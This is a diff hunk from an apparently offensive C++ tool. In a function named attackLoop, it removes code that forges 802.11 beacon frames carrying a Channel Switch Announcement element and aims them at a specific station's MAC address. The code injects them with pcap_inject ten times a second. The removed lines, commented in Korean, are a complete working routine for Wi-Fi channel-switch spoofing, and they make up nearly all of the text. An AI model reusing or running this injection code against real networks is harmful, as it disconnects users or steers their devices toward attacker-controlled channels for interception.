@@ -53,52 +53,7 @@ void attackLoop(pcap_t* handle) {
         csa.newChannel = 0x0B;
         csa.channelSwitchCount = 0x03;
 
-        // tag 순회하며 CSA 삽입 (tag number 정렬 유지)
-        std::vector<uint8_t> newTags;
-        bool csaInserted = false;
-        int pos = tagStart;
 
-        while (pos + 2 <= tagEnd) {
-            uint8_t tagNum = pkt[pos];
-            uint8_t tagLen = pkt[pos + 1];
-
-            if (tagNum == 0x25) {
-                // 기존 CSA 있으면 교체
-                newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
-                csaInserted = true;
-                pos += 2 + tagLen;
-                continue;
-            }
-            if (!csaInserted && tagNum > 0x25) {
-                // 정렬 위치에 삽입
-                newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
-                csaInserted = true;
-            }
-            if (pos + 2 + tagLen > tagEnd) break;
-            newTags.insert(newTags.end(), pkt + pos, pkt + pos + 2 + tagLen);
-            pos += 2 + tagLen;
-        }
-
-        if (!csaInserted) {
-            newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
-        }
-
-        // 새 패킷 조립: [Radiotap][Dot11Hdr+Fix][수정된 Tags]
-        std::vector<uint8_t> newPacket;
-        newPacket.insert(newPacket.end(), pkt, pkt + tagStart);
-        newPacket.insert(newPacket.end(), newTags.begin(), newTags.end());
-
-        // addr1 교체
-        int addr1Offset = rtLen + 4;
-        memcpy(newPacket.data() + addr1Offset, station.mac_, 6);
-
-        if (pcap_inject(handle, newPacket.data(), newPacket.size()) < 0)
-            fprintf(stderr, "inject error: %s\n", pcap_geterr(handle));
-
-        count++;
-        printf("\rSent %d CSA beacon", count);
-        fflush(stdout);
-        usleep(100000);
     }
 }
 
